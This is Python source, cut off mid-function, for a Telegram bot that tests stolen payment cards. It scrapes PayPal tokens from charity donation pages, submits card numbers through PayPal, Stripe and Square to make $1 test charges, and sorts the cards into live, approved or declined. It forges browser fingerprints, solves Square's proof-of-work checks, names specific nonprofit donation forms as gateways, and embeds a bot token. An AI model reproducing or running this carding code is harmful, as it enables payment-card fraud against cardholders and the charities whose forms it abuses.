import os
import re
import time
import random
import string
import asyncio
import httpx
import requests
import json
import hashlib
import uuid
import base64
from urllib.parse import urlparse
from fake_useragent import UserAgent
from requests_toolbelt import MultipartEncoder
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
)
from datetime import datetime

TOKEN = '7327856614:AAG9fY6rjp_wPKTLNnQCgoZdzagla3h9-80'

ADMINS = [6843321125]
VIP_USERS = {}
BANNED_USERS = {}
ALL_USERS = set()
GATEWAYS = []
stop_users = {}
last_check_time = {}
ANTI_SPAM_SECONDS = 7
user_tasks = {}
CODES = {}
gateway_index = 0
STRIPE_KEYS = {}
pending_files = {}

try:
    with open('stripe_keys.json', 'r') as f:
        STRIPE_KEYS = json.load(f)
except:
    STRIPE_KEYS = {}

PREMIUM_EMOJI_IDS = {
    "🚀": "5195033767969839232",
    "🤖": "6039619012051082706",
    "💎": "6039601162167000043",
    "⭐": "6034999602925542852",
    "✅": "6034891730526935918",
    "❌": "6039615816595414817",
    "📌": "6039389463228981149",
    "👥": "6046639187636003094",
    "👤": "6041709716231429926",
    "🦾": "6042051651462766312",
    "⚡": "6037229996622225123",
    "🌟": "5956369596528204273",
    "😳": "5900230031757547198",
    "😂": "6026036006178789152",
    "💲": "5929335569128623821",
    "🎺": "5929509352095354418",
    "📎": "5926906120877640711",
    "👁": "5976794472418121581",
    "💀": "5976323628038363401",
    "💰": "4983539296163070766",
    "🛑": "6039615816595414817",
    "🔥": "5424972470023104089",
    "🏦": "5332455502917949981",
    "⏱": "5382194935057372936",
    "💳": "5445353829304387411",
}

def premium_emoji(text):
    if not text:
        return text
    result = text
    sorted_emojis = sorted(PREMIUM_EMOJI_IDS.keys(), key=len, reverse=True)
    for emoji in sorted_emojis:
        doc_id = PREMIUM_EMOJI_IDS[emoji]
        result = result.replace(emoji, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
api_semaphore = asyncio.Semaphore(6)

async def get_bin_info(bin_number):
    urls = [f"https://bins.antipublic.cc/bins/{bin_number}", f"https://lookup.binlist.net/{bin_number}"]
    for url in urls:
        try:
            async with httpx.AsyncClient(timeout=10) as client:
                r = await client.get(url)
            if r.status_code != 200:
                continue
            data = r.json()
            brand = data.get("scheme") or data.get("brand") or data.get("type")
            card_type = data.get("type") or data.get("card_type")
            bank = data.get("bank", {}).get("name") if isinstance(data.get("bank"), dict) else data.get("bank")
            country = data.get("country", {}).get("name") if isinstance(data.get("country"), dict) else data.get("country")
            if not bank:
                bank = data.get("issuer") or data.get("bank_name")
            if not country:
                country = data.get("country_name")
            if brand or bank or country:
                return (f"{brand or 'Unknown'} - {card_type or 'Unknown'}", bank or "Unknown", country or "Unknown")
        except:
            continue
        await asyncio.sleep(0.5)
    return "Unknown", "Unknown", "Unknown"

# ===================== PAYPAL CLASS =====================

class PayPalLinkTester:
    def __init__(self, target_url):
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.donation = "1.00"
        self.r = requests.Session()
        self.r.verify = False
        self.uu = UserAgent()
        self.client_id = None
        self.access_token = None
        self.client_token = None
        self.form_data = {}
        self.ajax_url = None
        self.cookies = {}
        self.target_url = target_url
        self.url = urlparse(target_url).netloc
        self.inurl = urlparse(target_url).path
        if urlparse(target_url).query:
            self.inurl += f"?{urlparse(target_url).query}"
        self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"

    def Charge(self, ccx):
        try:
            self._init_and_extract()
            self._try_all_token_methods()
            
            parts = ccx.strip().split("|")
            if len(parts) < 4:
                return "Invalid card format"
            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            if "20" in yy:
                yy = yy.split("20")[1]
            
            try:
                exp_year = int(f"20{yy}")
                exp_month = int(mm)
                now = datetime.now()
                if exp_year < now.year or (exp_year == now.year and exp_month < now.month):
                    return "EXPIRED_CARD"
            except:
                pass
            
            expiry = f"20{yy}-{mm}"
            order_id = self._create_order()
            
            if not order_id:
                return "Create Order Failed"
            
            auth_tokens = []
            if self.client_token:
                auth_tokens.append(self.client_token)
            if self.access_token:
                auth_tokens.append(self.access_token)
            if self.client_id:
                auth_tokens.append(self.client_id)
            
            confirm_json = {}
            for auth_token in auth_tokens:
                he4 = {
                    'authorization': f'Bearer {auth_token}',
                    'paypal-client-metadata-id': self.client_id or '',
                    'user-agent': self.uu.random,
                    'paypal-request-id': str(uuid.uuid4()),
                }
                da3 = {
                    'payment_source': {
                        'card': {
                            'number': n,
                            'expiry': expiry,
                            'security_code': cvc,
                            'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                        }
                    },
                    'application_context': {'vault': False},
                }
                try:
                    confirm_res = self.r.post(
                        f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                        headers=he4,
                        json=da3,
                        timeout=15
                    )
                    
                    # ننضف الرد من confirm فورًا
                    clean = self._clean_response(confirm_res.text)
                    if clean and clean != "DECLINED":
                        return clean
                    
                    if confirm_res.status_code == 200:
                        try:
                            confirm_json = confirm_res.json()
                        except:
                            confirm_json = {}
                        break
                except:
                    continue
            
            # Check confirm_json for errors
            if isinstance(confirm_json, dict):
                confirm_str = str(confirm_json).upper()
                if 'INSUFFICIENT_FUNDS' in confirm_str:
                    return "INSUFFICIENT_FUNDS"
                if 'RESTRICTED_OR_INACTIVE_ACCOUNT' in confirm_str:
                    return "RESTRICTED_OR_INACTIVE_ACCOUNT"
                if 'PAYEE_BLOCKED_TRANSACTION' in confirm_str:
                    return "PAYEE_BLOCKED_TRANSACTION"
                if 'SUSPECTED_FRAUD' in confirm_str:
                    return "SUSPECTED_FRAUD"
                if 'EXPIRED_CARD' in confirm_str:
                    return "EXPIRED_CARD"
            
            approve_res = self._approve_order(order_id)
            text = approve_res.text if approve_res else ''
            
            return self._clean_response(text)
        except Exception as e:
            return f"Error: {e}"

    def _init_and_extract(self):
        try:
            headers = {'user-agent': self.uu.random, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.9'}
            response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=15)
            self.cookies = dict(response.cookies)
            html = response.text
            self._extract_client_id(html)
            self._extract_form_data(html)
            self._extract_ajax_url(html)
            self._extract_all_tokens(html)
        except:
            pass

    def _extract_client_id(self, html):
        patterns = [
            r'client-id=["\']([^"\']+)["\']',
            r'client_id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'data-client-id=["\']([^"\']+)["\']',
            r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']',
            r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'"clientId"\s*:\s*"([^"]+)"',
            r'client_id\s*=\s*["\']([^"\']+)["\']',
            r'merchant-id=["\']([^"\']+)["\']',
            r'data-merchant-id=["\']([^"\']+)["\']',
            r'"merchant_id"\s*:\s*"([^"]+)"',
            r'data-paypal-client-id=["\']([^"\']+)["\']',
            r'paypal-client-id=["\']([^"\']+)["\']',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                self.client_id = match.group(1)
                return
        
        script_matches = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
        for script in script_matches:
            for pattern in patterns:
                match = re.search(pattern, script, re.IGNORECASE)
                if match:
                    self.client_id = match.group(1)
                    return
        
        long_strings = re.findall(r'["\']([A-Za-z0-9_-]{80,})["\']', html)
        for string in long_strings:
            if string.startswith(('A', 'B', 'E')):
                self.client_id = string
                return

    def _extract_form_data(self, html):
        inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html)
        for name, value in inputs:
            self.form_data[name] = value
        
        data_attrs = re.findall(r'data-([\w-]+)="([^"]+)"', html)
        for attr_name, attr_value in data_attrs:
            if any(k in attr_name.lower() for k in ['give', 'paypal', 'form', 'client', 'merchant', 'nonce', 'hash', 'token', 'order']):
                self.form_data[attr_name] = attr_value

    def _extract_ajax_url(self, html):
        if 'admin-ajax.php' in html:
            self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
        elif 'wc-ajax' in html:
            self.ajax_url = f'https://{self.url}/?wc-ajax=checkout'

    def _extract_all_tokens(self, html):
        patterns = [
            r'data-client-token=["\']([^"\']+)["\']',
            r'"data-client-token"\s*:\s*"([^"]+)"',
            r'client-token=["\']([^"\']+)["\']',
            r'client_token=["\']([^"\']+)["\']',
            r'clientToken=["\']([^"\']+)["\']',
            r'"clientToken"\s*:\s*"([^"]+)"',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                enc = match.group(1)
                try:
                    padded = enc + '=' * (-len(enc) % 4)
                    decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
                    token_match = re.search(r'"accessToken":"([^"]+)"', decoded)
                    if token_match:
                        self.access_token = token_match.group(1)
                        return
                except:
                    pass
                self.client_token = enc
                return
        
        direct_patterns = [
            r'accessToken["\']?\s*:\s*["\']([^"\']+)["\']',
            r'"accessToken"\s*:\s*"([^"]+)"',
            r'access_token["\']?\s*:\s*["\']([^"\']+)["\']',
            r'"access_token"\s*:\s*"([^"]+)"',
            r'accessToken=([^&\s"\']+)',
        ]
        
        for pattern in direct_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                self.access_token = match.group(1)
                return

    def _try_all_token_methods(self):
        if self.access_token:
            return
        
        if self.client_id:
            token = self._get_oauth_token()
            if token:
                self.access_token = token
                return
        
        if self.ajax_url:
            token = self._get_client_token_from_site()
            if token:
                self.access_token = token
                return

    def _get_oauth_token(self):
        try:
            auth_header = base64.b64encode(f"{self.client_id}:".encode()).decode()
            headers = {
                'authorization': f'Basic {auth_header}',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': self.uu.random,
            }
            response = self.r.post(
                'https://api-m.paypal.com/v1/oauth2/token',
                headers=headers,
                data={'grant_type': 'client_credentials'},
                timeout=15
            )
            if response.status_code == 200:
                return response.json().get('access_token')
        except:
            pass
        
        try:
            response = self.r.post(
                'https://api-m.paypal.com/v1/oauth2/token',
                auth=(self.client_id, ''),
                data={'grant_type': 'client_credentials'},
                headers={'user-agent': self.uu.random},
                timeout=15
            )
            if response.status_code == 200:
                return response.json().get('access_token')
        except:
            pass
        
        return None

    def _get_client_token_from_site(self):
        actions = [
            'give_paypal_commerce_get_client_token',
            'get_client_token',
            'paypal_get_client_token',
            'give_paypal_get_client_token',
            'ppcp_get_client_token',
            'wc_ppcp_get_client_token',
        ]
        
        for action in actions:
            try:
                data = {'action': action, 'form-id': self.form_data.get('give-form-id', '')}
                headers = {
                    'user-agent': self.uu.random,
                    'x-requested-with': 'XMLHttpRequest',
                    'origin': f'https://{self.url}',
                    'referer': f'https://{self.url}{self.inurl}',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                }
                response = self.r.post(self.ajax_url, data=data, headers=headers, cookies=self.cookies, timeout=10)
                if response.status_code == 200 and response.text:
                    json_data = response.json()
                    token = None
                    if 'data' in json_data:
                        if isinstance(json_data['data'], dict):
                            token = json_data['data'].get('client_token') or json_data['data'].get('token') or json_data['data'].get('access_token')
                        elif isinstance(json_data['data'], str):
                            token = json_data['data']
                    elif 'client_token' in json_data:
                        token = json_data['client_token']
                    elif 'token' in json_data:
                        token = json_data['token']
                    elif 'access_token' in json_data:
                        token = json_data['access_token']
                    
                    if token:
                        if '.' not in token:
                            try:
                                padded = token + '=' * (-len(token) % 4)
                                decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
                                token_match = re.search(r'"accessToken":"([^"]+)"', decoded)
                                if token_match:
                                    return token_match.group(1)
                            except:
                                pass
                        return token
            except:
                continue
        
        return None

    def _clean_response(self, text):
        if not text:
            return "DECLINED"
        
        text_upper = text.upper()
        text_lower = text.lower()
        
        if '<!DOCTYPE' in text_upper or '<html' in text_upper:
            return "DECLINED"
        
        # نحاول نقرأ JSON
        try:
            json_data = json.loads(text)
            if isinstance(json_data, dict):
                # check data.status
                if 'data' in json_data and isinstance(json_data['data'], dict):
                    if 'status' in json_data['data']:
                        status_val = str(json_data['data']['status']).upper()
                        if status_val == 'COMPLETED':
                            return "CHARGE 1.0"
                    if 'success' in json_data['data']:
                        if json_data['data']['success'] == True or str(json_data['data']['success']).lower() == 'true':
                            return "CHARGE 1.0"
                
                # check status
                if 'status' in json_data:
                    status_val = str(json_data['status']).upper()
                    if status_val == 'COMPLETED':
                        return "CHARGE 1.0"
                
                # check success
                if 'success' in json_data:
                    if json_data['success'] == True or str(json_data['success']).lower() == 'true':
                        return "CHARGE 1.0"
        except:
            pass
        
        # لو النص "true" صريح
        if text_lower.strip() == 'true':
            return "CHARGE 1.0"
        
        # رسائل محددة
        if 'insufficient' in text_lower:
            return "INSUFFICIENT_FUNDS"
        
        if 'order_not_approved' in text_lower:
            return "Payer cannot pay for this transaction."
            
        if 'expired_card' in text_lower or 'expired_credit_card' in text_lower:
            return "EXPIRED_CARD"
        elif 'payee_blocked_transaction' in text_lower:
            return "PAYEE_BLOCKED_TRANSACTION"
        elif 'suspected_fraud' in text_lower:
            return "SUSPECTED_FRAUD"
        elif 'restricted_or_inactive_account' in text_lower:
            return "RESTRICTED_OR_INACTIVE_ACCOUNT"
        elif 'declined' in text_lower or 'error' in text_lower or 'expecting' in text_lower or 'invalid' in text_lower or 'failed' in text_lower:
            return "DECLINED"
        
        return text[:80]

    def _create_order(self):
        if self.ajax_url and 'admin-ajax' in self.ajax_url:
            order_id = self._create_order_givewp()
            if order_id:
                return order_id
        
        if self.access_token:
            order_id = self._create_order_direct()
            if order_id:
                return order_id
        
        if self.client_token:
            order_id = self._create_order_with_client_token()
            if order_id:
                return order_id
        
        return None

    def _create_order_givewp(self):
        if not self.ajax_url:
            return None
        form_data = self.form_data.copy()
        form_data.update({
            'give-amount': self.donation,
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'give-gateway': 'paypal-commerce',
        })
        headers = {
            'user-agent': self.uu.random,
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{self.url}',
            'referer': f'https://{self.url}{self.inurl}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }
        actions = ['give_paypal_commerce_create_order', 'give_create_order', 'create_order']
        for action in actions:
            params = {'action': action}
            try:
                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                if response.status_code == 200 and response.text:
                    try:
                        json_data = response.json()
                        if 'data' in json_data:
                            if isinstance(json_data['data'], dict) and 'id' in json_data['data']:
                                return json_data['data']['id']
                            elif isinstance(json_data['data'], str):
                                return json_data['data']
                        if 'id' in json_data:
                            return json_data['id']
                        if 'order_id' in json_data:
                            return json_data['order_id']
                        if 'orderID' in json_data:
                            return json_data['orderID']
                    except:
                        pass
            except:
                continue
        return None

    def _create_order_direct(self):
        if not self.access_token:
            return None
        try:
            headers = {
                'authorization': f'Bearer {self.access_token}',
                'content-type': 'application/json',
                'user-agent': self.uu.random,
                'accept': 'application/json',
                'paypal-request-id': str(uuid.uuid4()),
            }
            data = {
                'intent': 'CAPTURE',
                'purchase_units': [{
                    'amount': {'currency_code': 'USD', 'value': self.donation}
                }],
                'application_context': {
                    'shipping_preference': 'NO_SHIPPING',
                    'user_action': 'PAY_NOW',
                }
            }
            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
            if response.status_code in [200, 201]:
                response_data = response.json()
                if 'id' in response_data:
                    return response_data['id']
            return None
        except:
            return None

    def _create_order_with_client_token(self):
        if not self.client_token:
            return None
        try:
            headers = {
                'authorization': f'Bearer {self.client_token}',
                'content-type': 'application/json',
                'user-agent': self.uu.random,
                'accept': 'application/json',
            }
            data = {
                'intent': 'CAPTURE',
                'purchase_units': [{
                    'amount': {'currency_code': 'USD', 'value': self.donation}
                }]
            }
            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
            if response.status_code in [200, 201]:
                response_data = response.json()
                if 'id' in response_data:
                    return response_data['id']
            return None
        except:
            return None

    def _approve_order(self, order_id):
        if self.ajax_url and 'admin-ajax' in self.ajax_url:
            result = self._approve_order_givewp(order_id)
            if result:
                return result
        
        if self.access_token:
            try:
                headers = {
                    'authorization': f'Bearer {self.access_token}',
                    'content-type': 'application/json',
                    'user-agent': self.uu.random,
                }
                response = self.r.post(
                    f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/capture',
                    headers=headers,
                    timeout=15
                )
                return response
            except:
                pass
        
        return None

    def _approve_order_givewp(self, order_id):
        if not self.ajax_url:
            return None
        form_data = self.form_data.copy()
        form_data.update({
            'give-amount': self.donation,
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'give-gateway': 'paypal-commerce',
        })
        headers = {
            'user-agent': self.uu.random,
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{self.url}',
            'referer': f'https://{self.url}{self.inurl}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }
        actions = ['give_paypal_commerce_approve_order', 'give_approve_order', 'approve_order']
        for action in actions:
            params = {'action': action, 'order': order_id}
            try:
                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                if response.status_code == 200:
                    return response
            except:
                continue
        return None

# ===================== END PAYPAL CLASS =====================

async def check_card_api(card_full, gateway_url):
    async with api_semaphore:
        try:
            loop = asyncio.get_event_loop()
            def run_check():
                pp_engine = PayPalLinkTester(target_url=gateway_url if gateway_url else 'https://www.sandiegoyokohamasistercity.org/donations/donation-form/')
                return pp_engine.Charge(card_full)
            result_raw = await loop.run_in_executor(None, run_check)
            result = str(result_raw).lower()
            
            if "charge 1.0" in result or "charge $" in result:
                return "approved", result_raw
            elif "insufficient" in result:
                return "live", result_raw
            else:
                return "declined", result_raw if result_raw else "Declined"
        except Exception as e:
            return "declined", f"Error: {e}"

def check_stripe_sync(card, key_id="1"):
    try:
        if not STRIPE_KEYS:
            return "No Stripe keys"
        key = STRIPE_KEYS.get(str(key_id))
        if not key:
            return f"Key {key_id} not found"
        pk = key.get("pk", "")
        sk = key.get("sk", "")
        if not pk or not sk:
            return f"Key {key_id}: Invalid keys"
        parts = card.strip().split("|")
        if len(parts) != 4:
            return "INVALID FORMAT"
        cc_number, exp_month, exp_year, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        if len(exp_year) == 2:
            exp_year = "20" + exp_year
        session = requests.Session()
        session.verify = False
        headers = {"Authorization": f"Bearer {pk}", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
        data = {"card[number]": cc_number, "card[exp_month]": exp_month, "card[exp_year]": exp_year, "card[cvc]": cvc}
        r = session.post("https://api.stripe.com/v1/tokens", headers=headers, data=data, timeout=30)
        if r.status_code != 200:
            error = r.json().get("error", {})
            error_msg = error.get("message", "Unknown")
            decline_code = error.get("decline_code", "")
            error_code = error.get("code", "")
            if decline_code:
                return f"Key {key_id} | {decline_code}: {error_msg}"
            elif error_code:
                return f"Key {key_id} | {error_code}: {error_msg}"
            else:
                return f"Key {key_id} | {error_msg[:50]}"
        token_id = r.json()["id"]
        headers = {"Authorization": f"Bearer {sk}", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
        data = {"amount": "100", "currency": "usd", "source": token_id, "description": "WAFA"}
        r = session.post("https://api.stripe.com/v1/charges", headers=headers, data=data, timeout=30)
        if r.status_code == 200:
            status = r.json().get("status", "")
            if status == "succeeded":
                return f"Key {key_id} | CHARGE $1"
            elif status in ["pending", "processing"]:
                return f"Key {key_id} | LIVE"
            else:
                return f"Key {key_id} | {status}"
        else:
            error = r.json().get("error", {})
            error_msg = error.get("message", "Unknown")
            decline_code = error.get("decline_code", "")
            error_code = error.get("code", "")
            if decline_code:
                return f"Key {key_id} | {decline_code}: {error_msg}"
            elif error_code:
                return f"Key {key_id} | {error_code}: {error_msg}"
            else:
                return f"Key {key_id} | {error_msg[:50]}"
    except Exception as e:
        return f"Key {key_id} | Error: {str(e)[:50]}"
    finally:
        try:
            session.close()
        except:
            pass

def classify_square_error(msg):
    msg_lower = str(msg).lower()
    if 'insufficient' in msg_lower:
        return 'LIVE'
    elif 'declined' in msg_lower:
        return 'DECLINED'
    elif 'pan_failure' in msg_lower:
        return 'DECLINED'
    elif 'cvv' in msg_lower or 'security code' in msg_lower:
        return 'DECLINED'
    elif 'expired' in msg_lower:
        return 'DECLINED'
    elif 'success' in msg_lower or 'charged' in msg_lower or 'thank' in msg_lower:
        return 'CHARGE'
    else:
        return msg_lower[:60]

def collect_square_errors(obj, msgs):
    if isinstance(obj, list):
        for item in obj:
            if isinstance(item, str):
                msgs.append(item)
            elif isinstance(item, (dict, list)):
                collect_square_errors(item, msgs)
    elif isinstance(obj, dict):
        for val in obj.values():
            collect_square_errors(val, msgs)

def parse_square_response(text):
    try:
        data = json.loads(text)
    except:
        error_div = re.search(r'gateway_error.*?\\["(.*?)"\\]', text, re.DOTALL)
        if error_div:
            return classify_square_error(error_div.group(1))
        return text[:100]
    if data.get('success') is True:
        return 'CHARGE'
    if data.get('success') is False:
        err_data = data.get('data', {})
        errors = err_data.get('errors', {})
        all_msgs = []
        collect_square_errors(errors, all_msgs)
        if all_msgs:
            return classify_square_error(all_msgs[0])
        return json.dumps(errors)[:100]
    return text[:100]

def check_square_sync(card):
    parts = card.strip().split('|')
    if len(parts) < 4:
        return 'INVALID_FORMAT'
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 2:
        yy = '20' + yy
    session = requests.Session()
    session.verify = False
    try:
        iframe_url = 'https://www.andrewscenter.com/?givewp-route=donation-form-view&form-id=1720'
        r0 = session.get(iframe_url, headers={'User-Agent': UA}, timeout=30)
        html = r0.text
        sig_m = re.search(r'givewp-route=donate[^"]*givewp-route-signature=([a-f0-9]+)[^"]*givewp-route-signature-id=([\w-]+)[^"]*givewp-route-signature-expiration=(\d+)', html)
        if not sig_m:
            return 'Error: No signature'
        route_sig, route_sig_id, route_sig_exp = sig_m.group(1), sig_m.group(2), sig_m.group(3)
        sq_app = re.search(r'sq0idp-[a-zA-Z0-9_-]+', html)
        sq_loc = re.search(r'locationId["\s:=]+["\s]*([A-Za-z0-9]+)', html)
        app_id = sq_app.group(0) if sq_app else 'sq0idp-4pgmJ7BkILYxRsHw5RYiRQ'
        location_id = sq_loc.group(1) if sq_loc else 'LGA5CPZR68ZK4'
        sq_headers = {'authority': 'pci-connect.squareup.com', 'accept': 'application/json', 'content-type': 'application/json; charset=utf-8', 'origin': 'https://web.squarecdn.com', 'referer': 'https://web.squarecdn.com/', 'user-agent': UA}
        hydrate_resp = session.get('https://pci-connect.squareup.com/payments/hydrate', params={'applicationId': app_id, 'hostname': 'andrewscenter.com', 'locationId': location_id, 'version': '1.82.7'}, headers=sq_headers, timeout=30)
        hydrate_data = hydrate_resp.json()
        session_id = hydrate_data.get('sessionId', '')
        instance_id = hydrate_data.get('instanceId', str(uuid.uuid4()))
        pow_prefix = hydrate_data.get('powPrefix', '00000')
        if not session_id:
            return 'Error: No session'
        cookies = dict(hydrate_resp.cookies)
        cookies['_savt'] = hydrate_data.get('avt', str(uuid.uuid4()))
        combo_str = f'{app_id},{location_id},{instance_id}'
        pow_counter = 0
        while True:
            pow_counter += 1
            test = f'{session_id}:{pow_counter}:{combo_str}'
            if hashlib.sha256(test.encode()).hexdigest().startswith(pow_prefix):
                break
            if pow_counter > 10000000:
                return 'Error: PoW failed'
        payment_tracking_id = str(uuid.uuid4())
        fp_v1 = '{"user_agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36","language":"en-US","resolution":[846,381],"available_resolution":[846,381],"timezone_offset":-120,"open_database":1,"navigator_platform":"Linux armv81","regular_plugins":[],"adblock":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]}'
        fp_v1_hash = hashlib.md5(fp_v1.encode()).hexdigest()
        fp_v2 = '{"fonts":["sans-serif-thin"],"dom_blockers":[],"font_preferences":{"default":164.71,"apple":164.71,"serif":164.71,"sans":150.43,"mono":132.62,"min":10.29,"system":150.43},"audio":124.08,"screen_frame":[0,0,0,0],"languages":[["en-US"]],"device_memory":8,"screen_resolution":[846,381],"hardware_concurrency":8,"timezone":"Africa/Cairo","indexed_db":true,"open_database":true,"platform":"Linux armv81","plugins":[],"canvas":{"winding":true,"geometry":"test","text":"test"},"touch_support":{"max_touch_points":5,"touch_event":true,"touch_start":true},"vendor":"","vendor_flavors":[],"cookie_enabled":true,"color_depth":24}'
        fp_v2_hash = hashlib.md5(fp_v2.encode()).hexdigest()
        nonce_json = {'analytics': {'fingerprints': [{'components': fp_v1, 'fingerprint': fp_v1_hash, 'version': 'fingerprint-v1'}, {'components': fp_v2, 'fingerprint': fp_v2_hash, 'version': 'fingerprint-v2'}], 'timezone': '-120', 'website_url': 'https://andrewscenter.com/'}, 'client_id': app_id, 'instance_id': instance_id, 'location_id': location_id, 'payment_method_tracking_id': payment_tracking_id, 'session_id': session_id, 'card_data': {'cvv': cvv, 'exp_month': int(mm), 'exp_year': int(yy), 'number': cc}, 'pow_counter': pow_counter}
        nonce_resp = session.post('https://pci-connect.squareup.com/v2/card-nonce', params={'_': str(int(time.time() * 1000)), 'version': '1.82.7'}, cookies=cookies, headers=sq_headers, json=nonce_json, timeout=30)
        nonce_data = nonce_resp.json()
        if 'pow_prefix' in nonce_data:
            pow_base = nonce_data.get('pow_base', session_id)
            pow_prefix2 = nonce_data['pow_prefix']
            combo_str2 = f'{app_id},{location_id},{instance_id}'
            pow_counter2 = 0
            while True:
                pow_counter2 += 1
                test2 = f'{pow_base}:{pow_counter2}:{combo_str2}'
                if hashlib.sha256(test2.encode()).hexdigest().startswith(pow_prefix2):
                    break
                if pow_counter2 > 10000000:
                    break
            nonce_json['session_id'] = pow_base
            nonce_json['pow_counter'] = pow_counter2
            nonce_resp = session.post('https://pci-connect.squareup.com/v2/card-nonce', params={'_': str(int(time.time() * 1000)), 'version': '1.82.7'}, cookies=cookies, headers=sq_headers, json=nonce_json, timeout=30)
            nonce_data = nonce_resp.json()
        if 'errors' in nonce_data:
            errors = nonce_data['errors']
            if isinstance(errors, list) and len(errors) > 0:
                err = errors[0]
                return classify_square_error(f"{err.get('code', 'UNKNOWN')}: {err.get('detail', '')}")
        card_nonce = nonce_data.get('card_nonce') or nonce_data.get('nonce', '')
        if not card_nonce:
            return 'Error: No nonce'
        email = f'drgam{random.randint(100,999)}@gmail.com'
        donate_params = {'givewp-route': 'donate', 'givewp-route-signature': route_sig, 'givewp-route-signature-id': route_sig_id, 'givewp-route-signature-expiration': route_sig_exp}
        donate_files = {'amount': (None, '1'), 'currency': (None, 'USD'), 'donationType': (None, 'single'), 'formId': (None, '1720'), 'gatewayId': (None, 'square'), 'firstName': (None, 'John'), 'lastName': (None, 'Doe'), 'email': (None, email), 'country': (None, 'US'), 'address1': (None, '123 Main St'), 'city': (None, 'New York'), 'state': (None, 'NY'), 'zip': (None, '10001'), 'originUrl': (None, 'https://www.andrewscenter.com/donate/'), 'isEmbed': (None, 'true'), 'embedId': (None, '1720'), 'locale': (None, 'en_US'), 'gatewayData[square-card-nonce]': (None, card_nonce)}
        donate_headers = {'authority': 'andrewscenter.com', 'accept': 'application/json', 'origin': 'https://www.andrewscenter.com', 'referer': 'https://www.andrewscenter.com/donate/', 'user-agent': UA}
        donate_resp = session.post('https://www.andrewscenter.com/', params=donate_params, headers=donate_headers, files=donate_files, timeout=60)
        return parse_square_response(donate_resp.text)
    except Exception as e:
        return f'Error: {str(e)[:80]}'
    finally:
        session.close()

def check_auth_sync(card):
    try:
        session = requests.Session()
        session.verify = False
        data = MultipartEncoder({'data': (None, card),})
        headers = {
            'authority': 'uncoder.eu.org',
            'accept': '*/*',
            'accept-language': 'ar-CA,ar;q=0.9,en-CA;q=0.8,en;q=0.7,en-US;q=0.6',
            'content-type': data.content_type,
            'origin': 'https://uncoder.eu.org',
            'referer': 'https://uncoder.eu.org/cc-checker/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        }
        start_time = time.time()
        response = session.post('https://uncoder.eu.org/cc-checker/api.php', headers=headers, data=data)
        end_time = time.time()
        taken = round(end_time - start_time, 2)
        
        try:
            json_data = response.json()
            message = json_data.get('message', '')
            
            if 'approved' in message.lower():
                return {'status': 'approved', 'message': 'Approved — $0 auth', 'taken': taken}
            elif 'insufficient' in message.lower():
                return {'status': 'live', 'message': 'Insufficient Funds', 'taken': taken}
            else:
                return {'status': 'declined', 'message': message[:80], 'taken': taken}
        except:
